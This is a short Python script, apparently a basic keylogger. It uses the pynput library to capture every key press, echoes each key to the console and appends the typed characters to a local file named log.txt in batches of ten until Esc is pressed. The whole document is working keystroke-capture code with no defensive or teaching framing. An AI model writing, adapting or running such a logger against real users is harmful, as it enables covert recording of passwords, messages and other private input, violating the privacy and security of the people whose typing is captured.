import pynput  # handle special keys like space, enter
from pynput.keyboard import Key,Listener, KeyCode # capture keyboard events

count = 0
keys =[]

def press_key(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key)) # put a key in string 
    if count >=10:
        count = 0
        file(keys)
        keys =[]


def file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)    

def release_key(key):
    if isinstance(key, Key) and key == Key.esc:
        return False

with Listener(on_press=press_key, on_release=release_key) as listener:
    listener.join()
